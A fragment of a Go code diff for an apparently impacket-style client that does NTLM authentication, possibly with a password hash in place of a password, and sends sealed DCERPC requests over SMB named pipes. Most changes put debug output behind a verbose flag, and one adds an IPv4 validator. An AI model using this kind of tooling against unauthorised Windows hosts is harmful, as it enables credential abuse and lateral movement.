+		fmt.Printf("[DEBUG] Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])
+	}
 
 	// Compute MIC if VERSION flag is set
 	// MIC = HMAC-MD5(exportedSessionKey, Negotiate + Challenge + Authenticate[with MIC zeroed])
@@ -1058,13 +1220,17 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 		h.Write(authenticateMsg) // MIC is already zeroed in authenticateMsg
 		mic := h.Sum(nil)
 
-		fmt.Printf("[DEBUG] MIC calculated: %x\n", mic)
+		if verbose {
+			fmt.Printf("[DEBUG] MIC calculated: %x\n", mic)
+		}
 
 		// Place MIC in the message
 		copy(authenticateMsg[micFieldOffset:micFieldOffset+16], mic)
 	}
 
-	fmt.Printf("[DEBUG] Final Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])
+	if verbose {
+		fmt.Printf("[DEBUG] Final Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])
+	}
 
 	return authenticateMsg
 }
@@ -1078,6 +1244,30 @@ func isNTLMHash(input string) bool {
 	}
 	for _, c := range input {
 		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+			return false
+		}
+	}
+	return true
+}
+
+// isValidIP validates IPv4 address format
+func isValidIP(ip string) bool {
+	parts := strings.Split(ip, ".")
+	if len(parts) != 4 {
+		return false
+	}
+	for _, part := range parts {
+		if len(part) == 0 || len(part) > 3 {
+			return false
+		}
+		num := 0
+		for _, c := range part {
+			if c < '0' || c > '9' {
+				return false
+			}
+			num = num*10 + int(c-'0')
+		}
+		if num > 255 {
 			return false
 		}
 	}
@@ -1125,7 +1315,9 @@ func ntlmv2Hash(ntHash []byte, user, domain string) []byte {
 	// CRITICAL: Only uppercase the user, NOT the domain!
 	userUpper := uppercaseString(user)
 	identity := userUpper + domain
-	fmt.Printf("[DEBUG] NTLMv2 identity: user='%s' (upper: '%s') + domain='%s' = '%s'\n", user, userUpper, domain, identity)
+	if verbose {
+		fmt.Printf("[DEBUG] NTLMv2 identity: user='%s' (upper: '%s') + domain='%s' = '%s'\n", user, userUpper, domain, identity)
+	}
 	h.Write(stringToUTF16LE(identity))
 	return h.Sum(nil)
 }
@@ -1224,7 +1416,9 @@ func calculateSealKey(sessionKey []byte, client bool) []byte {
 }
 
 func buildTempBlob(timestamp int64, clientChallenge, targetInfo []byte) []byte {
-	fmt.Printf("[DEBUG] buildTempBlob: targetInfo length=%d, last 50 bytes: %x\n", len(targetInfo), targetInfo[len(targetInfo)-50:])
+	if verbose {
+		fmt.Printf("[DEBUG] buildTempBlob: targetInfo length=%d, last 50 bytes: %x\n", len(targetInfo), targetInfo[len(targetInfo)-50:])
+	}
 
 	buf := new(bytes.Buffer)
 
@@ -1263,7 +1457,9 @@ func extractHostnameFromTargetInfo(targetInfo []byte) []byte {
 			if offset+int(avLen) <= len(targetInfo) {
 				hostname := make([]byte, avLen)
 				copy(hostname, targetInfo[offset:offset+int(avLen)])
-				fmt.Printf("[DEBUG] Extracted hostname from AV_PAIR 0x%04x: %d bytes\n", avID, avLen)
+				if verbose {
+					fmt.Printf("[DEBUG] Extracted hostname from AV_PAIR 0x%04x: %d bytes\n", avID, avLen)
+				}
 				return hostname
 			}
 		}
@@ -1277,7 +1473,9 @@ func extractHostnameFromTargetInfo(targetInfo []byte) []byte {
 // Format: 'cifs/' + hostname (UTF-16LE)
 func addTargetNameToAVPairs(targetInfo []byte, hostname []byte) []byte {
 	// Parse existing AV_PAIRS and remove EOL marker (we'll add it back at the end)
-	fmt.Printf("[DEBUG] Processing targetInfo (%d bytes)\n", len(targetInfo))
+	if verbose {
+		fmt.Printf("[DEBUG] Processing targetInfo (%d bytes)\n", len(targetInfo))
+	}
 	filtered := new(bytes.Buffer)
 	offset := 0
 	for offset+4 <= len(targetInfo) {
@@ -1290,18 +1488,24 @@ func addTargetNameToAVPairs(targetInfo []byte, hostname []byte) []byte {
 
 		// Keep ALL av_pairs from server (like Python does)
 		filtered.Write(targetInfo[offset : offset+4+int(avLen)])
-		fmt.Printf("[DEBUG] Including AV_PAIR 0x%04x (len=%d)\n", avID, avLen)
+		if verbose {
+			fmt.Printf("[DEBUG] Including AV_PAIR 0x%04x (len=%d)\n", avID, avLen)
+		}
 
 		offset += 4 + int(avLen)
 	}
 	targetInfo = filtered.Bytes()
-	fmt.Printf("[DEBUG] After removing EOL: %d bytes\n", len(targetInfo))
+	if verbose {
+		fmt.Printf("[DEBUG] After removing EOL: %d bytes\n", len(targetInfo))
+	}
 
 	// Build TARGET_NAME: 'cifs/' + hostname
 	cifsPrefix := stringToUTF16LE("cifs/")
 	targetName := append(cifsPrefix, hostname...)
 
-	fmt.Printf("[DEBUG] TARGET_NAME construction:\n")
+	if verbose {
+		fmt.Printf("[DEBUG] TARGET_NAME construction:\n")
+	}
 	fmt.Printf("  cifs/ prefix: %d bytes\n", len(cifsPrefix))
 	fmt.Printf("  hostname: %d bytes\n", len(hostname))
 	fmt.Printf("  total TARGET_NAME: %d bytes\n", len(targetName))
@@ -1447,7 +1651,9 @@ func createDCERPCAuth3(auth *NTLMAuth, authenticateMsg []byte) []byte {
 
 // sendAuthenticatedRequestWithResponse sends a request and returns the decrypted response data
 func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) ([]byte, error) {
-	fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
+	if verbose {
+		fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
+	}
 
 	// Create DCERPC Request with auth verifier
 	req := createAuthenticatedRequest(auth, opnum, stub)
@@ -1455,7 +1661,9 @@ func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum 
 	if len(req) < truncLen {
 		truncLen = len(req)
 	}
-	fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
+	if verbose {
+		fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
+	}
 
 	// Use WritePipe/ReadPipe (like impacket does)
 	fmt.Println("[+] Sending authenticated request via WritePipe...")
@@ -1471,7 +1679,9 @@ func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum 
 		return nil, fmt.Errorf("request read failed: %v", err)
 	}
 	resp = resp[:nResp]
-	fmt.Printf("[DEBUG] Got %d bytes encrypted response\n", len(resp))
+	if verbose {
+		fmt.Printf("[DEBUG] Got %d bytes encrypted response\n", len(resp))
+	}
 
 	// Parse DCERPC response header
 	if len(resp) < 24 {
@@ -1482,7 +1692,9 @@ func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum 
 	fragLen := binary.LittleEndian.Uint16(resp[8:10])
 	authLen := binary.LittleEndian.Uint16(resp[10:12])
 
-	fmt.Printf("[DEBUG] Response: type=%d, fragLen=%d, authLen=%d\n", packetType, fragLen, authLen)
+	if verbose {
+		fmt.Printf("[DEBUG] Response: type=%d, fragLen=%d, authLen=%d\n", packetType, fragLen, authLen)
+	}
 
 	// Check for DCERPC fault (type 3)
 	if packetType == dcerpcFault {
@@ -1512,17 +1724,23 @@ func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum 
 			encryptedStub = encryptedStub[:len(encryptedStub)-int(authPadLen)]
 		}
 
-		fmt.Printf("[DEBUG] Encrypted stub: %d bytes (authPadLen=%d)\n", len(encryptedStub), authPadLen)
+		if verbose {
+			fmt.Printf("[DEBUG] Encrypted stub: %d bytes (authPadLen=%d)\n", len(encryptedStub), authPadLen)
+		}
 
 		// Decrypt stub with server seal handle (continued RC4 stream)
 		decryptedStub := make([]byte, len(encryptedStub))
 		auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)
 
-		fmt.Printf("[DEBUG] Decrypted stub: %x\n", decryptedStub)
+		if verbose {
+			fmt.Printf("[DEBUG] Decrypted stub: %x\n", decryptedStub)
+		}
 
 		// Verify signature (extract from auth trailer)
 		signature := resp[authTrailerStart+8 : authTrailerStart+8+int(authLen)]
-		fmt.Printf("[DEBUG] Response signature: %x\n", signature)
+		if verbose {
+			fmt.Printf("[DEBUG] Response signature: %x\n", signature)
+		}
 
 		// Build complete decrypted response: header + decrypted stub
 		result := make([]byte, 24+len(decryptedStub))
@@ -1542,7 +1760,9 @@ func sendAuthenticatedRequest(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub
 }
 
 func sendAuthenticatedRequestOld(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) error {
-	fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
+	if verbose {
+		fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
+	}
 
 	// Create DCERPC Request with auth verifier
 	req := createAuthenticatedRequest(auth, opnum, stub)
@@ -1550,7 +1770,9 @@ func sendAuthenticatedRequestOld(pipe *smb.File, auth *NTLMAuth, opnum uint16, s
 	if len(req) < truncLen {
 		truncLen = len(req)
 	}
-	fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
+	if verbose {
+		fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
+	}
 
 	// Use WritePipe/ReadPipe (like impacket does)
 	fmt.Println("[+] Sending authenticated request via WritePipe...")
@@ -1566,7 +1788,9 @@ func sendAuthenticatedRequestOld(pipe *smb.File, auth *NTLMAuth, opnum uint16, s
 		return fmt.Errorf("request read failed: %v", err)
 	}
 	resp = resp[:nResp]
-	fmt.Printf("[DEBUG] Request sent, got %d bytes response: %x\n", len(resp), resp)
+	if verbose {
+		fmt.Printf("[DEBUG] Request sent, got %d bytes response: %x\n", len(resp), resp)
+	}
 	if len(resp) >= 24 && resp[2] == dcerpcFault {
 		status := binary.LittleEndian.Uint32(resp[24:28])
 		if status == 0x6f7 {
@@ -1609,7 +1833,9 @@ func sendAuthenticatedRequestOld(pipe *smb.File, auth *NTLMAuth, opnum uint16, s
 func createAuthenticatedRequest(auth *NTLMAuth, opnum uint16, stub []byte) []byte {
 
 	// Use current sequence number (starts at 0 like impacket)
-	fmt.Printf("[DEBUG] Using sequence number: %d for authenticated request\n", auth.seqNum)
+	if verbose {
+		fmt.Printf("[DEBUG] Using sequence number: %d for authenticated request\n", auth.seqNum)
+	}
 
 	buf := new(bytes.Buffer)
 
@@ -1633,7 +1859,9 @@ func createAuthenticatedRequest(auth *NTLMAuth, opnum uint16, stub []byte) []byt
 	binary.Write(buf, binary.LittleEndian, uint32(len(stub))) // Alloc hint = stub length before padding
 	binary.Write(buf, binary.LittleEndian, uint16(0))         // Context ID
 	binary.Write(buf, binary.LittleEndian, uint16(opnum))     // Opnum
-	fmt.Printf("[DEBUG] DCERPC Request: ContextID=%d, Opnum=%d, StubLen=%d (padded=%d), alloc_hint=%d\n", 0, opnum, len(stub), len(stub)+stubPadLength, len(stub))
+	if verbose {
+		fmt.Printf("[DEBUG] DCERPC Request: ContextID=%d, Opnum=%d, StubLen=%d (padded=%d), alloc_hint=%d\n", 0, opnum, len(stub), len(stub)+stubPadLength, len(stub))
+	}
 
 	// PLAINTEXT stub with padding (will be encrypted together)
 	stubStartPos := buf.Len()
